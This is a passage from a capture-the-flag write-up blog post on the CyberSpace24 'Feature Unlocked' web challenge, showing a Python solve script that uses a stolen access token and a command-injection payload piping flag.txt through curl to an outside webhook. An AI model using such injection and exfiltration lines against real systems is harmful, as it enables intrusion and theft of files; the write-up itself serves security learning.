</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Response Text: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># If the response includes a &#39;Set-Cookie&#39; header, print it to check the access_token</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=s1>&#39;Set-Cookie&#39;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Set-Cookie Header: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Set-Cookie&#39;</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>Running <code>python gen.py</code> should give us the token</p><p><img alt=get-token loading=lazy src=/blog/images/2024-09-02-11-03-04.png></p><p>And it did! Let&rsquo;s now craft another script <code>solve.py</code> to retrieve the <code>flag.txt</code></p><h3 id=solvepy><code>solve.py</code><a hidden class=anchor aria-hidden=true href=#solvepy>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Replace these values with your actual values</span>
</span></span><span class=line><span class=cl><span class=n>access_token</span> <span class=o>=</span> <span class=s1>&#39;ImFjY2Vzc19ncmFudGVkIg.ZtWNIQ.efPFQEBT8jNFoIlWVhjSeYC2Iuk&#39;</span>
</span></span><span class=line><span class=cl><span class=n>feature_url</span> <span class=o>=</span> <span class=s1>&#39;https://feature-unlocked-web.challs.csc.tf/feature&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Text to be sent to the /feature endpoint for word count testing</span>
</span></span><span class=line><span class=cl><span class=n>text_body</span> <span class=o>=</span> <span class=s1>&#39;This; cat flag.txt | curl -X POST -d @- https://webhook.site/ea19e1c2-91bb-469b-bfd4-8f3608541e56&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Create the headers with the access token</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Cookie&#39;</span><span class=p>:</span> <span class=sa>f</span><span class=s1>&#39;access_token=</span><span class=si>{</span><span class=n>access_token</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Create the payload with the text to be processed</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;text&#39;</span><span class=p>:</span> <span class=n>text_body</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Make the POST request to the /feature endpoint</span>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>feature_url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Print the response from the server</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Status Code: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Response Content:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></div><p>Running <code>python solve.py</code> should send a request to our webhook, and we should see the flag there.</p><p><img alt=flag loading=lazy src=/blog/images/2024-09-02-11-06-34.png></p><p>There we go~ flag is: <code>CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!}</code></p><hr><p>From this challenge, we learned the importance of:</p><ol><li><strong>Understanding Validation Mechanisms</strong>: Knowing how to manipulate and bypass validation checks can help in exploiting such features.</li><li><strong>Using Debug Parameters</strong>: Identifying how debug modes or parameters can be leveraged to control or redirect application behavior.</li><li><strong>Remote Code Execution (RCE)</strong>: Recognizing and exploiting RCE vulnerabilities, especially in contexts where subprocess commands are involved.</li><li><strong>Custom Validation Servers</strong>: Realizing the risks of trusting external or custom validation servers without proper security checks.</li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hxuu.github.io/blog/tags/ctf/>Ctf</a></li><li><a href=https://hxuu.github.io/blog/tags/write-up/>Write-Up</a></li><li><a href=https://hxuu.github.io/blog/tags/cyberspace/>Cyberspace</a></li></ul><nav class=paginav><a class=prev href=https://hxuu.github.io/blog/ctf/cyberspace24/trendzz/><span class=title>« Prev</span><br><span>CyberSpace24 - Trendzz</span>
</a><a class=next href=https://hxuu.github.io/blog/ctf/sekai24/funny-lfr/><span class=title>Next »</span><br><span>SEKAI 24 - Funny Lfr</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Feature Unlocked on x" href="https://x.com/intent/tweet/?text=CyberSpace24%20-%20Feature%20Unlocked&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ffeature-unlocked%2f&amp;hashtags=ctf%2cwrite-up%2ccyberspace"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Feature Unlocked on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ffeature-unlocked%2f&amp;title=CyberSpace24%20-%20Feature%20Unlocked&amp;summary=CyberSpace24%20-%20Feature%20Unlocked&amp;source=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ffeature-unlocked%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Feature Unlocked on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ffeature-unlocked%2f&title=CyberSpace24%20-%20Feature%20Unlocked"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Feature Unlocked on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ffeature-unlocked%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Feature Unlocked on whatsapp" href="https://api.whatsapp.com/send?text=CyberSpace24%20-%20Feature%20Unlocked%20-%20https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ffeature-unlocked%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Feature Unlocked on telegram" href="https://telegram.me/share/url?text=CyberSpace24%20-%20Feature%20Unlocked&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ffeature-unlocked%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Feature Unlocked on ycombinator" href="https://news.ycombinator.com/submitlink?t=CyberSpace24%20-%20Feature%20Unlocked&u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ffeature-unlocked%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hxuu.github.io/blog/>hxuu</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>